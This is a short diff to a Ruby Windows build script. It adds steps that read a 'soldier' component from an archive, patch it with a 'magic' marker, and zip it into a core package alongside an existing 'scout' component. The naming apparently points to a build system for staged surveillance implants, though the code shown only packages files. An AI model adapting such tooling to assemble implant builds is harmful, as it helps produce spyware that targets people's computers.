@@ -242,6 +242,10 @@ class BuildWindows < Build
       core_content = z.file.open('scout', "rb") { |f| f.read }
       add_magic(core_content)
       File.open(Config.instance.temp('scout'), "wb") {|f| f.write core_content}
+
+      core_content = z.file.open('soldier', "rb") { |f| f.read }
+      add_magic(core_content)
+      File.open(Config.instance.temp('soldier'), "wb") {|f| f.write core_content}
     end
 
     # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
@@ -253,6 +257,9 @@ class BuildWindows < Build
 
     CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('scout')}"
     FileUtils.rm_rf Config.instance.temp('scout')
+
+    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('soldier')}"
+    FileUtils.rm_rf Config.instance.temp('soldier')
   end
 
   def scout_name(seed)
